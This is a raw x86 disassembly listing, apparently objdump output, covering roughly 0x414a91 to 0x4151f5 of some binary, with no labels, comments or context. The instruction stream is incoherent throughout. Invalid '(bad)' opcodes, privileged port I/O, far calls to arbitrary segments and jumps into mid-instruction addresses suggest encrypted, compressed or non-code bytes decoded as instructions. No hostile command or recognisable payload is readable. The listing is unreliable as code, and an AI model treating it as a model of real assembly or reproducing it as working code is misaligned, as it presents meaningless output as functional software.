  414a91:	bound  ecx,QWORD PTR [edx]
  414a93:	pop    edi
  414a94:	bound  esp,QWORD PTR [edx-0xf]
  414a97:	xchg   ebp,eax
  414a98:	add    al,0xef
  414a9a:	neg    bh
  414a9c:	mov    ds:0x827967f9,eax
  414aa1:	js     0x414a99
  414aa3:	and    BYTE PTR [edi],0xf4
  414aa6:	pop    ss
  414aa7:	inc    ebx
  414aa8:	out    0x39,eax
  414aaa:	into   
  414aab:	jo     0x414aeb
  414aad:	jnp    0x414a94
  414aaf:	cmp    ah,BYTE PTR [edi]
  414ab1:	pop    ds
  414ab2:	pop    edi
  414ab3:	xchg   esp,eax
  414ab4:	ret    
  414ab5:	pop    esp
  414ab6:	mov    ch,BYTE PTR [eax+0x18]
  414ab9:	fcomp  DWORD PTR [esi-0x28]
  414abc:	push   ds
  414abd:	pop    ss
  414abe:	(bad)  
  414abf:	out    0x53,al
  414ac1:	fild   DWORD PTR [ecx]
  414ac3:	data16 mov WORD PTR ss:[ecx],es
  414ac7:	lods   al,BYTE PTR ds:[esi]
  414ac8:	cmp    al,0xb4
  414aca:	inc    edx
  414acb:	shl    DWORD PTR [ecx],cl
  414acd:	inc    ecx
  414ace:	and    dh,BYTE PTR [esi]
  414ad0:	ins    DWORD PTR es:[edi],dx
  414ad1:	scas   al,BYTE PTR es:[edi]
  414ad2:	mul    bh
  414ad4:	pcmpeqd mm2,mm6
  414ad7:	mov    eax,ds:0x1307d9cb
  414adc:	arpl   WORD PTR fs:[ecx],cx
  414adf:	int3   
  414ae0:	scas   al,BYTE PTR es:[edi]
  414ae1:	xchg   DWORD PTR [ebp+0x3425d368],ebx
  414ae7:	mov    ds:0xa9c3627d,eax
  414aec:	ror    DWORD PTR [ecx-0x2900cdda],1
  414af2:	xchg   ecx,ecx
  414af4:	jnp    0x414b54
  414af6:	push   ds
  414af7:	sub    al,0x47
  414af9:	pop    esi
  414afa:	xor    cl,ah
  414afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414afd:	daa    
  414afe:	outs   dx,BYTE PTR ds:[esi]
  414aff:	int3   
  414b00:	pop    ecx
  414b01:	or     dl,BYTE PTR [ebp+edi*4-0x62c8eb0e]
  414b08:	dec    eax
  414b09:	xor    ecx,eax
  414b0b:	dec    ecx
  414b0c:	(bad)  
  414b0d:	jnp    0x414af1
  414b0f:	je     0x414aaf
  414b11:	jns    0x414b4d
  414b13:	xchg   DWORD PTR [eax-0x54],edx
  414b16:	out    dx,eax
  414b17:	data16 js 0x414b6d
  414b1a:	cwde   
  414b1b:	(bad)  
  414b1c:	loopne 0x414b02
  414b1e:	sbb    esp,ebp
  414b20:	push   ebx
  414b21:	cmp    eax,0xd684a809
  414b26:	inc    edi
  414b27:	push   esi
  414b28:	pop    ds
  414b29:	inc    eax
  414b2a:	in     al,dx
  414b2b:	fcom   DWORD PTR [ebp+0x5a7f909b]
  414b31:	neg    bl
  414b33:	sbb    BYTE PTR [edx-0x794bec95],dl
  414b39:	ins    DWORD PTR es:[edi],dx
  414b3a:	cmc    
  414b3b:	lds    edi,FWORD PTR [esi+0x49]
  414b3e:	cld    
  414b3f:	enter  0x80f2,0xf4
  414b43:	test   DWORD PTR [ecx+0x5468251f],edi
  414b49:	sub    cl,bh
  414b4b:	jmp    0x414b30
  414b4d:	sub    ebp,esp
  414b4f:	jns    0x414b3f
  414b51:	shr    ecx,1
  414b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b54:	lods   eax,DWORD PTR ds:[esi]
  414b55:	int3   
  414b56:	fisttp DWORD PTR [ebx+0x9dfe9b0]
  414b5c:	pusha  
  414b5d:	(bad)  
  414b5e:	mov    bh,0xd0
  414b60:	pop    ds
  414b61:	stos   BYTE PTR es:[edi],al
  414b62:	into   
  414b63:	cmp    al,0xb3
  414b65:	adc    al,0x72
  414b67:	mov    esi,0x10e2055e
  414b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b6d:	add    dh,BYTE PTR [edx+0x5c]
  414b70:	nop
  414b71:	xchg   esp,eax
  414b72:	retf   0xd371
  414b75:	loope  0x414b97
  414b77:	sar    ah,0xe8
  414b7a:	enter  0xfcc7,0x75
  414b7e:	fist   DWORD PTR [ebx]
  414b80:	xchg   DWORD PTR [edi],ecx
  414b82:	fdiv   st(7),st
  414b84:	lds    ebx,FWORD PTR ds:0xcf3a43c4
  414b8a:	adc    dh,bl
  414b8c:	cmc    
  414b8d:	cmp    DWORD PTR [esi+ebp*4],0x27
  414b91:	retf   
  414b92:	push   0x79
  414b94:	or     DWORD PTR fs:[esi],ebx
  414b97:	mov    ecx,0x9c318036
  414b9c:	test   DWORD PTR [edx],ebp
  414b9e:	mov    DWORD PTR [eax+edi*2+0x6dcefcb2],ebx
  414ba5:	mov    bl,0x76
  414ba7:	add    ch,BYTE PTR [ecx]
  414ba9:	cli    
  414baa:	cmp    edx,DWORD PTR [eax-0x8]
  414bad:	dec    eax
  414bae:	les    esi,FWORD PTR [ebp+0xbafbb01]
  414bb4:	nop    DWORD PTR [edx]
  414bb7:	clc    
  414bb8:	jae    0x414b7a
  414bba:	xchg   ch,ah
  414bbc:	mov    ch,0x34
  414bbe:	inc    eax
  414bbf:	xor    dh,BYTE PTR [edi-0x325e59a7]
  414bc5:	cmp    edi,DWORD PTR [edx]
  414bc7:	mov    BYTE PTR [esi+0x72],al
  414bca:	pop    esp
  414bcb:	jae    0x414b79
  414bcd:	fwait
  414bce:	jg     0x414c1e
  414bd0:	or     al,BYTE PTR [ebx-0x1f]
  414bd3:	data16 or BYTE PTR [edi+esi*1+0x7ab08dd1],dl
  414bdb:	outs   dx,BYTE PTR ds:[esi]
  414bdc:	fdivr  DWORD PTR [eax+0x657ae6bf]
  414be2:	es stc 
  414be4:	cmp    ebx,ecx
  414be6:	pop    esp
  414be7:	pop    eax
  414be8:	sub    DWORD PTR [esi],ecx
  414bea:	leave  
  414beb:	scas   eax,DWORD PTR es:[edi]
  414bec:	stos   BYTE PTR es:[edi],al
  414bed:	and    eax,0x9497fa97
  414bf2:	out    dx,eax
  414bf3:	push   ebx
  414bf4:	push   cs
  414bf5:	hlt    
  414bf6:	xor    BYTE PTR [edx],bl
  414bf8:	jbe    0x414c1b
  414bfa:	and    BYTE PTR [edi-0x33],dh
  414bfd:	mov    ds:0x542cde76,eax
  414c02:	or     al,0xb9
  414c04:	jne    0x414bd7
  414c06:	out    0xd4,al
  414c08:	mov    ebp,0xd7d7cb4a
  414c0d:	pop    ss
  414c0e:	out    0xf2,al
  414c10:	xor    BYTE PTR [ebp-0x18],ah
  414c13:	lds    esi,FWORD PTR [ebp-0x2fc171a5]
  414c19:	fcom   DWORD PTR [ebp+0xa]
  414c1c:	mov    al,ds:0x83bb6b66
  414c21:	pop    eax
  414c22:	and    al,0x20
  414c24:	sbb    eax,0x54b5313c
  414c29:	jno    0x414bb1
  414c2b:	adc    eax,0x2abf6db5
  414c30:	sbb    eax,0x98545623
  414c35:	or     al,0xea
  414c37:	pop    ss
  414c38:	cmp    eax,0xee63b8cd
  414c3d:	les    esp,FWORD PTR [ebx-0x6c4e66c7]
  414c43:	sub    DWORD PTR [eax+0x7d],esi
  414c46:	or     cl,bl
  414c48:	ror    edi,cl
  414c4a:	dec    esp
  414c4b:	push   ecx
  414c4c:	jne    0x414c64
  414c4e:	out    0x99,al
  414c50:	add    eax,0xd74d9906
  414c55:	das    
  414c56:	out    dx,al
  414c57:	(bad)
  414c5a:	sti    
  414c5b:	dec    ecx
  414c5c:	pop    es
  414c5d:	jle    0x414c6c
  414c5f:	repnz pushf 
  414c61:	mov    bh,0xb4
  414c63:	mov    bl,0xae
  414c65:	xor    DWORD PTR [eax+eiz*1],edi
  414c68:	fidivr WORD PTR [esi]
  414c6a:	sbb    al,0x5c
  414c6c:	test   eax,0xd4c40c7a
  414c71:	xchg   ecx,eax
  414c72:	in     al,dx
  414c73:	aad    0xde
  414c75:	adc    eax,0x508343c2
  414c7a:	mov    ch,0x94
  414c7c:	ja     0x414c1c
  414c7e:	adc    BYTE PTR [ebp-0x70],0xd9
  414c82:	inc    esp
  414c83:	pop    eax
  414c84:	in     eax,0xbb
  414c86:	(bad)  
  414c87:	pop    dx
  414c89:	(bad)  
  414c8a:	lea    eax,[esi-0x4a539081]
  414c90:	mov    eax,0x8c4eb9cd
  414c95:	push   ecx
  414c96:	lods   al,BYTE PTR ds:[esi]
  414c97:	ror    ecx,cl
  414c99:	in     eax,dx
  414c9a:	lock fnstcw WORD PTR [ebx+0x5b]
  414c9e:	out    dx,eax
  414c9f:	ret    0x1e1f
  414ca2:	sbb    DWORD PTR [ecx],eax
  414ca4:	adc    esp,0x87d44945
  414caa:	jne    0x414c37
  414cac:	gs retf 0xc926
  414cb0:	shl    DWORD PTR [eax+0x723827c2],cl
  414cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cb7:	mov    esp,0x9932a6d3
  414cbc:	rol    BYTE PTR [ecx+0x1f],1
  414cbf:	stc    
  414cc0:	xor    DWORD PTR [edx],ebx
  414cc2:	addr16 mov edi,0x63f976c9
  414cc8:	inc    edx
  414cc9:	and    eax,0x4e0d7b67
  414cce:	fcomp  QWORD PTR [esi+0x2a]
  414cd1:	inc    edx
  414cd2:	inc    eax
  414cd3:	rcr    eax,1
  414cd5:	adc    al,0xfe
  414cd7:	shr    BYTE PTR [esp+ecx*8],0x64
  414cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cdc:	mov    ss,WORD PTR cs:[edi-0x12684ff9]
  414ce3:	xchg   ecx,eax
  414ce4:	sub    DWORD PTR [edi],edx
  414ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ce7:	imul   esp,DWORD PTR [ecx],0x3e
  414cea:	stc    
  414ceb:	sub    dh,cl
  414ced:	or     al,0x23
  414cef:	es pushf 
  414cf1:	or     BYTE PTR [ebx],dh
  414cf3:	mov    WORD PTR [edx-0x5],ss
  414cf6:	in     al,dx
  414cf7:	fwait
  414cf8:	hlt    
  414cf9:	or     edx,DWORD PTR [edi]
  414cfb:	cs inc edi
  414cfd:	mov    al,ds:0xf7369515
  414d02:	psubq  mm4,QWORD PTR [ebx+0x12]
  414d06:	dec    esp
  414d07:	cmc    
  414d08:	pop    ebx
  414d09:	or     BYTE PTR [eax],al
  414d0b:	mov    eax,0x1f05781
  414d10:	scas   eax,DWORD PTR es:[edi]
  414d11:	enter  0x52d7,0x88
  414d15:	ret    
  414d16:	and    al,0x4e
  414d18:	iret   
  414d19:	adc    ecx,esi
  414d1b:	and    ebp,esi
  414d1d:	mov    ch,0xb0
  414d1f:	xchg   DWORD PTR [ecx],esp
  414d21:	bound  ebp,QWORD PTR [esi]
  414d23:	in     al,dx
  414d24:	mov    ds:0xb8aecc4,al
  414d29:	and    esp,DWORD PTR ds:0xe2cac7f1
  414d2f:	xor    ebx,eax
  414d31:	mov    eax,DWORD PTR [esi]
  414d33:	and    ah,BYTE PTR [ebp+0x72]
  414d36:	inc    eax
  414d37:	ja     0x414d54
  414d39:	lock stos DWORD PTR es:[edi],eax
  414d3b:	cs dec eax
  414d3d:	or     bl,dh
  414d3f:	fidivr DWORD PTR [ecx]
  414d41:	stos   DWORD PTR es:[edi],eax
  414d42:	into   
  414d43:	and    BYTE PTR [ecx],bh
  414d45:	outs   dx,BYTE PTR ds:[esi]
  414d46:	test   DWORD PTR [eax+0x47],0x93f7f116
  414d4d:	cmp    BYTE PTR [edx+eax*4+0x33c3bb5b],0x49
  414d55:	sbb    eax,0xbbb67f73
  414d5a:	xchg   eax,edi
  414d5c:	es leave 
  414d5e:	push   0xb89f42ae
  414d63:	or     eax,0x84079ce9
  414d68:	sub    BYTE PTR [ecx],cl
  414d6a:	mov    cl,0xfa
  414d6c:	div    DWORD PTR [esi]
  414d6e:	out    0x19,al
  414d70:	js     0x414de4
  414d72:	je     0x414d18
  414d74:	inc    esp
  414d75:	dec    ebx
  414d76:	fisub  DWORD PTR [eax]
  414d78:	xchg   ebp,eax
  414d79:	mov    al,ds:0x54640417
  414d7e:	mov    ch,0x69
  414d80:	mov    ah,0x92
  414d82:	mov    dh,0x24
  414d84:	clc    
  414d85:	gs inc esp
  414d87:	cmp    DWORD PTR [eax-0x12ce623f],0x728fd410
  414d91:	fidivr WORD PTR [edi]
  414d93:	mov    ah,0xd
  414d95:	cld    
  414d96:	in     eax,0x74
  414d98:	in     al,0x7e
  414d9a:	test   BYTE PTR [ebp+0x4ef221a0],0xc3
  414da1:	into   
  414da2:	sub    dl,BYTE PTR [ecx-0xe]
  414da5:	xor    edx,DWORD PTR [edi-0x60]
  414da8:	in     eax,0x7
  414daa:	jns    0x414d8e
  414dac:	push   0xffffffca
  414dae:	in     eax,dx
  414daf:	in     eax,0xb7
  414db1:	jg     0x414de3
  414db3:	stos   BYTE PTR es:[edi],al
  414db4:	add    BYTE PTR [eax+0x4fe79774],bh
  414dba:	aad    0x73
  414dbc:	cmp    DWORD PTR [edi],ecx
  414dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dbf:	jmp    0x6c858288
  414dc4:	dec    edx
  414dc5:	bound  ebp,QWORD PTR [edx-0x72ad01f0]
  414dcb:	jg     0x414d4f
  414dcd:	adc    bh,0x33
  414dd0:	icebp  
  414dd1:	add    ebx,edi
  414dd3:	push   ebx
  414dd4:	shl    BYTE PTR [ecx+0x65b66318],0x3b
  414ddb:	int    0x9b
  414ddd:	sub    DWORD PTR [esi+0x12dda7f7],edi
  414de3:	lea    ecx,[ebp+0x33e5bae8]
  414de9:	xor    al,0x1c
  414deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dec:	cmp    eax,0x47154632
  414df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414df2:	push   es
  414df3:	inc    eax
  414df4:	shl    BYTE PTR [edx],0xa6
  414df7:	out    0x3e,al
  414df9:	jp     0x414e07
  414dfb:	ss adc eax,0xd7182e70
  414e01:	retf   
  414e02:	xchg   edi,eax
  414e03:	mov    ds:0xcbd3ac26,eax
  414e08:	loop   0x414df4
  414e0a:	popw   ss
  414e0c:	mov    edx,0x84585c1e
  414e11:	sbb    al,BYTE PTR [edi]
  414e13:	js     0x414e52
  414e15:	cmp    eax,0x24078ec2
  414e1a:	test   eax,0x98de72cd
  414e1f:	mov    bh,0x6b
  414e21:	idiv   bh
  414e23:	aaa    
  414e24:	push   esp
  414e25:	enter  0x9f96,0xd7
  414e29:	mov    esi,0x158bec75
  414e2e:	jae    0x414dcb
  414e30:	shl    DWORD PTR [esi+ebp*1+0x28],0xed
  414e35:	or     cl,bl
  414e37:	cmc    
  414e38:	and    al,0x7e
  414e3a:	add    BYTE PTR [ebx+0x75],dh
  414e3d:	ret    0xf769
  414e40:	loopne 0x414e36
  414e42:	push   ecx
  414e43:	fs out 0x3f,eax
  414e46:	fs mov esi,0x16ea05d4
  414e4c:	inc    eax
  414e4d:	in     al,dx
  414e4e:	adc    esi,DWORD PTR [edx-0x5f663438]
  414e54:	pop    esp
  414e55:	loopne 0x414de4
  414e57:	mov    ecx,eax
  414e59:	ret    
  414e5a:	ror    DWORD PTR [esi],0x2e
  414e5d:	xor    dl,BYTE PTR [edi+0x65]
  414e60:	out    dx,al
  414e61:	jl     0x414e50
  414e63:	xor    eax,0x3c2ee4c1
  414e68:	inc    edx
  414e69:	xor    al,0xd5
  414e6b:	aaa    
  414e6c:	retf   0xac37
  414e6f:	pop    ebp
  414e70:	lea    edi,[ebp+0x4da7c21e]
  414e76:	test   BYTE PTR [esp+eax*1+0xb],ch
  414e7a:	sbb    DWORD PTR [eax],eax
  414e7c:	je     0x414e88
  414e7e:	cmp    al,0x2e
  414e80:	adc    bh,cl
  414e82:	aad    0x96
  414e84:	mov    BYTE PTR [ebp+0x68855105],ah
  414e8a:	sbb    esi,edx
  414e8c:	fstp   DWORD PTR [esi+0x50817812]
  414e92:	add    al,0x17
  414e94:	not    DWORD PTR [ebp+0x6e]
  414e97:	imul   ecx,DWORD PTR [eax],0x63608923
  414e9d:	out    0xb2,al
  414e9f:	in     al,0x3b
  414ea1:	xor    al,0x2d
  414ea3:	mov    ch,BYTE PTR [esi]
  414ea5:	es fsubr st,st(3)
  414ea8:	sti    
  414ea9:	(bad)  
  414eaa:	mov    edi,DWORD PTR [edi-0x37]
  414ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eae:	rcl    BYTE PTR [edx+eax*8+0x20],0x29
  414eb3:	stos   BYTE PTR es:[edi],al
  414eb4:	cmp    eax,0xea8e5f31
  414eb9:	nop
  414eba:	pop    ss
  414ebb:	mov    ds,WORD PTR [edi]
  414ebd:	loop   0x414ee4
  414ebf:	jno    0x414ec3
  414ec1:	out    0xf2,eax
  414ec3:	int3   
  414ec4:	into   
  414ec5:	leave  
  414ec6:	outs   dx,BYTE PTR ds:[esi]
  414ec7:	call   0xae77:0x73ee74ac
  414ece:	into   
  414ecf:	fisttp DWORD PTR [eax+ebp*1-0x57]
  414ed3:	add    esp,DWORD PTR [edi+0x49]
  414ed6:	(bad)  
  414ed7:	sbb    al,cl
  414ed9:	xchg   ecx,eax
  414eda:	add    eax,0xd432aa1b
  414edf:	scas   eax,DWORD PTR es:[edi]
  414ee0:	mov    ecx,0x59ac57b2
  414ee5:	adc    al,BYTE PTR [ebx-0x53]
  414ee8:	js     0x414ee7
  414eea:	jmp    DWORD PTR [esi]
  414eec:	or     ecx,DWORD PTR ss:[ecx+0x1528e004]
  414ef3:	mov    ds,eax
  414ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ef6:	ret    0xedcc
  414ef9:	mov    eax,0x36a3e4dc
  414efe:	out    dx,al
  414eff:	int    0xa5
  414f01:	pushf  
  414f02:	xchg   DWORD PTR [esi+ecx*2-0xca769e8],ebx
  414f09:	inc    ecx
  414f0a:	ret    
  414f0b:	or     DWORD PTR fs:[esi],edi
  414f0e:	push   es
  414f0f:	imul   DWORD PTR [ebp+ebp*2-0x7aa07b06]
  414f16:	dec    edi
  414f17:	mov    ch,0x91
  414f19:	imul   eax,esp,0x810a3fdc
  414f1f:	call   0x777e:0xaf9e5b43
  414f26:	push   esi
  414f27:	call   0xccf8:0x47948a16
  414f2e:	sub    eax,DWORD PTR [ebx-0x31]
  414f31:	inc    edi
  414f32:	and    al,0xab
  414f34:	or     edx,esp
  414f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f37:	clc    
  414f38:	pop    ebx
  414f39:	dec    eax
  414f3a:	aam    0xce
  414f3c:	in     al,dx
  414f3d:	and    BYTE PTR [esi+0x71],al
  414f40:	rcl    edi,0x7a
  414f43:	mov    esi,0x58c3cc0b
  414f48:	retf   
  414f49:	mov    al,0x1e
  414f4b:	mov    cl,0xd6
  414f4d:	outs   dx,DWORD PTR ds:[esi]
  414f4e:	(bad)  
  414f4f:	icebp  
  414f50:	pop    edx
  414f51:	and    ecx,DWORD PTR [edx]
  414f53:	fxch   st(4)
  414f55:	out    0x4b,eax
  414f57:	data16 jle 0x414f92
  414f5a:	sub    ecx,esp
  414f5c:	jecxz  0x414f99
  414f5e:	out    dx,eax
  414f5f:	leave  
  414f60:	sti    
  414f61:	xlat   BYTE PTR ds:[ebx]
  414f62:	sub    ebx,DWORD PTR gs:[esi-0x230f8ca]
  414f69:	or     eax,DWORD PTR [edx-0x6d]
  414f6c:	aad    0x6f
  414f6e:	ins    DWORD PTR es:[edi],dx
  414f6f:	fistp  DWORD PTR [eax-0x4bce2a72]
  414f75:	jnp    0x414fc6
  414f77:	imul   ebp,DWORD PTR [esi-0x6478d566],0x314aeed9
  414f81:	pop    edi
  414f82:	mov    BYTE PTR [eax+0x582eaefa],cl
  414f88:	add    dl,ch
  414f8a:	add    al,0xc2
  414f8c:	dec    esp
  414f8d:	js     0x414fcb
  414f8f:	retf   0x8b5f
  414f92:	jge    0x414f55
  414f94:	stc    
  414f95:	stc    
  414f96:	(bad)  [edx-0x28]
  414f99:	in     al,dx
  414f9a:	imul   DWORD PTR [edx+0x1c3b47bf]
  414fa0:	mov    WORD PTR [esi-0x53],?
  414fa3:	mov    dl,0xa7
  414fa5:	cmc    
  414fa6:	xchg   ecx,eax
  414fa7:	xchg   ecx,eax
  414fa8:	jmp    DWORD PTR [eax+eax*1]
  414fab:	xchg   esi,eax
  414fac:	push   eax
  414fad:	stos   DWORD PTR es:[edi],eax
  414fae:	adc    ah,BYTE PTR [eax+edi*2-0x5b]
  414fb2:	adc    al,0xc3
  414fb4:	fs push es
  414fb6:	push   0xffffff91
  414fb8:	(bad)  
  414fb9:	call   0x25b09612
  414fbe:	rep stos BYTE PTR es:[edi],al
  414fc0:	mov    ebx,0x4ad71053
  414fc5:	sbb    eax,0x4a8d1846
  414fca:	icebp  
  414fcb:	or     al,0x24
  414fcd:	sti    
  414fce:	xor    eax,DWORD PTR [ebp+0xc]
  414fd1:	outs   dx,DWORD PTR ds:[esi]
  414fd2:	lods   eax,DWORD PTR ds:[esi]
  414fd3:	lods   eax,DWORD PTR ds:[esi]
  414fd4:	push   eax
  414fd5:	lods   eax,DWORD PTR ds:[esi]
  414fd6:	fild   DWORD PTR [edx+0x75ad1138]
  414fdc:	idiv   DWORD PTR [esi-0x28]
  414fdf:	push   eax
  414fe0:	mov    bl,0x70
  414fe2:	adc    edi,DWORD PTR [edi-0x21]
  414fe5:	js     0x414fc3
  414fe7:	into   
  414fe8:	xchg   esi,eax
  414fe9:	pop    ebx
  414fea:	mov    ah,0x5b
  414fec:	inc    eax
  414fed:	or     BYTE PTR [edi],bh
  414fef:	out    0xe6,eax
  414ff1:	in     eax,dx
  414ff2:	mov    ds:0xa81e6d59,al
  414ff7:	jge    0x414f7d
  414ff9:	imul   eax
  414ffb:	dec    esp
  414ffc:	xchg   esp,eax
  414ffd:	iret   
  414ffe:	xchg   ebp,eax
  414fff:	inc    ebp
  415000:	and    ebx,DWORD PTR [ebx-0x12adcc6]
  415006:	dec    esp
  415007:	test   ch,ah
  415009:	(bad)  
  41500a:	dec    esp
  41500b:	dec    ebx
  41500c:	scas   al,BYTE PTR es:[edi]
  41500d:	cmp    ebp,ebx
  41500f:	popa   
  415010:	lods   al,BYTE PTR ds:[esi]
  415011:	and    al,bl
  415013:	adc    bh,cl
  415015:	(bad)  
  415016:	mov    ebx,0xb23cdc1f
  41501b:	or     edx,edx
  41501d:	pusha  
  41501e:	or     eax,0xffffffc7
  415021:	sbb    DWORD PTR [edi+0x73c38ece],0x1
  415028:	pop    ebx
  415029:	aas    
  41502a:	in     al,dx
  41502b:	ds xchg ebp,eax
  41502d:	xor    ecx,DWORD PTR [esi+0x17]
  415030:	popa   
  415031:	add    BYTE PTR ds:0x4ece31bb,ch
  415037:	jp     0x41503c
  415039:	jg     0x415095
  41503b:	adc    BYTE PTR [ecx],ah
  41503d:	pandn  mm3,QWORD PTR [edx]
  415040:	std    
  415041:	sub    ah,BYTE PTR [ecx+0x889dcf3]
  415047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415048:	cmpxchg BYTE PTR [esi-0x42],ch
  41504c:	fucomp st(7)
  41504e:	out    dx,eax
  41504f:	pop    eax
  415050:	test   ah,0x97
  415053:	out    0x4d,eax
  415055:	xor    esp,eax
  415057:	call   0xd50b:0x9f9ec3d2
  41505e:	xchg   edx,eax
  41505f:	rcr    ah,1
  415061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415062:	imul   DWORD PTR [ebp+0x5c]
  415065:	push   ecx
  415066:	add    al,0x86
  415068:	outs   dx,BYTE PTR ds:[esi]
  415069:	jp     0x415035
  41506b:	out    dx,eax
  41506c:	jecxz  0x4150d1
  41506e:	cwde   
  41506f:	adc    eax,0x43342ca
  415074:	les    ebx,FWORD PTR [ebx-0x3194ecb5]
  41507a:	loopne 0x4150f7
  41507c:	jns    0x4150c3
  41507e:	stos   BYTE PTR es:[edi],al
  41507f:	pop    ebx
  415080:	dec    ebx
  415081:	add    ecx,edx
  415083:	ret    0x26bc
  415086:	hlt    
  415087:	shl    BYTE PTR [ebp+eiz*1-0x70],0x2f
  41508c:	mov    esp,0x23cad122
  415091:	fs push edi
  415093:	inc    edi
  415094:	std    
  415095:	clc    
  415096:	cli    
  415097:	addr16 xor al,0x25
  41509a:	pop    ebx
  41509b:	adc    DWORD PTR [edi+0x137e6ee],0xffffffb7
  4150a2:	outs   dx,DWORD PTR ds:[esi]
  4150a3:	jnp    0x415091
  4150a5:	out    dx,al
  4150a6:	sbb    DWORD PTR [eax+eax*4],ebp
  4150a9:	ja     0x415098
  4150ab:	call   0x4c15f564
  4150b0:	sar    DWORD PTR [ebx-0x19647e6c],0xa1
  4150b7:	mov    cl,0xf5
  4150b9:	cdq    
  4150ba:	pop    ecx
  4150bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150bc:	outs   dx,BYTE PTR ds:[esi]
  4150bd:	mov    ah,0x79
  4150bf:	lahf   
  4150c0:	retf   0xb118
  4150c3:	jo     0x415091
  4150c5:	neg    dh
  4150c7:	test   dl,al
  4150c9:	arpl   WORD PTR [ebx+0x57],cx
  4150cc:	push   es
  4150cd:	scas   al,BYTE PTR es:[edi]
  4150ce:	and    BYTE PTR [esi],dl
  4150d0:	int3   
  4150d1:	inc    edx
  4150d2:	dec    edx
  4150d3:	xchg   esp,eax
  4150d4:	lds    esi,FWORD PTR [eax-0x51]
  4150d7:	aad    0x3f
  4150d9:	pop    edi
  4150da:	dec    eax
  4150db:	push   ebx
  4150dc:	add    BYTE PTR [ebp+0x6aaa01a2],0x6
  4150e3:	cdq    
  4150e4:	mov    ch,0x1
  4150e6:	in     eax,0xbe
  4150e8:	add    al,0x2a
  4150ea:	dec    edx
  4150eb:	dec    edi
  4150ec:	stc    
  4150ed:	cmp    ebx,DWORD PTR [ebx-0x3a]
  4150f0:	dec    edx
  4150f1:	in     eax,0x7e
  4150f3:	stc    
  4150f4:	mov    bh,0xf1
  4150f6:	jno    0x41508a
  4150f8:	sub    DWORD PTR cs:[ebx],ecx
  4150fb:	icebp  
  4150fc:	pop    ebp
  4150fd:	push   cs
  4150fe:	or     DWORD PTR [edi],edi
  415100:	pop    es
  415101:	popa   
  415102:	(bad)  
  415103:	in     eax,dx
  415104:	pop    ecx
  415105:	dec    edi
  415106:	sbb    al,BYTE PTR [edi+0x4f]
  415109:	shr    DWORD PTR [edi],1
  41510b:	mov    ch,BYTE PTR ds:0x58234d83
  415111:	imul   esi,DWORD PTR [eax-0x6a5b0060],0x4f
  415118:	xchg   edx,ecx
  41511a:	pop    es
  41511b:	in     eax,0x7e
  41511d:	retf   
  41511e:	fsub   st,st(7)
  415120:	int3   
  415121:	xor    DWORD PTR [edx+0x45],ebx
  415124:	jp     0x41518e
  415126:	test   al,0x2c
  415128:	stos   DWORD PTR es:[edi],eax
  415129:	mov    eax,ds:0x6ec6dc7
  41512e:	int    0xfd
  415130:	mov    WORD PTR [edi-0x726482da],ss
  415136:	loopne 0x4150fc
  415138:	dec    edi
  415139:	mov    cl,al
  41513b:	dec    edx
  41513c:	push   cs
  41513d:	dec    ebp
  41513e:	jecxz  0x415199
  415140:	add    edi,DWORD PTR [edi+0x5a]
  415143:	leave  
  415144:	xor    bh,bh
  415146:	call   0xddeb:0x947ab258
  41514d:	aad    0x21
  41514f:	test   BYTE PTR [eax],cl
  415151:	ret    0xa800
  415154:	jle    0x4151a1
  415156:	dec    ebp
  415157:	mov    BYTE PTR [edx-0xb],ch
  41515a:	mov    ah,0xb9
  41515c:	mov    DWORD PTR [eax],esp
  41515e:	out    0xc0,al
  415160:	push   esi
  415161:	add    cl,BYTE PTR [ebp+ebx*4-0x1bd32eac]
  415168:	repnz rol DWORD PTR ss:[esi-0x2cd750d5],0x56
  415171:	push   0xdb7cf11b
  415176:	push   eax
  415177:	xchg   ecx,esp
  415179:	inc    ebx
  41517a:	cmp    eax,0x14a17b00
  41517f:	mov    ss,WORD PTR [ebp+ebp*8-0x117bb2eb]
  415186:	xchg   ebx,eax
  415187:	sbb    al,0xa2
  415189:	gs inc esp
  41518b:	mov    ecx,0x304855e
  415190:	push   ebp
  415191:	iret   
  415192:	rol    BYTE PTR [edx+esi*4+0x58b861fc],1
  415199:	mov    cl,0x8
  41519b:	pop    ebp
  41519c:	inc    edx
  41519d:	cmp    BYTE PTR [ebx+0xa985c07],ch
  4151a3:	mov    ebp,DWORD PTR [edx+0x5a03f2e9]
  4151a9:	ret    0x9a96
  4151ac:	inc    esi
  4151ad:	jbe    0x415148
  4151af:	or     eax,0x171f53c5
  4151b4:	out    dx,al
  4151b5:	or     al,0x65
  4151b7:	(bad)  
  4151b8:	ficom  WORD PTR [esi+0x29]
  4151bb:	icebp  
  4151bc:	fwait
  4151bd:	les    esi,FWORD PTR [esi]
  4151bf:	adc    bh,al
  4151c1:	das    
  4151c2:	mov    cl,0x79
  4151c4:	call   0x59956fb3
  4151c9:	jne    0x415197
  4151cb:	inc    esi
  4151cc:	xchg   BYTE PTR [ecx-0x5],dl
  4151cf:	clc    
  4151d0:	jno    0x41515e
  4151d2:	std    
  4151d3:	add    BYTE PTR [edi+0x6b],0xff
  4151d7:	xchg   DWORD PTR [ecx],edi
  4151d9:	push   ebp
  4151da:	jmp    0x2a16dcf
  4151df:	ret    
  4151e0:	jo     0x415256
  4151e2:	jecxz  0x415176
  4151e4:	mov    al,ds:0xfd0f5f9a
  4151e9:	enter  0x3a3f,0x29
  4151ed:	mov    WORD PTR [edi+0x1a],gs
  4151f0:	xchg   edi,eax
  4151f1:	in     al,dx
  4151f2:	je     0x41517e
  4151f4:	xchg   ebx,eax
  4151f5:	(bad)  
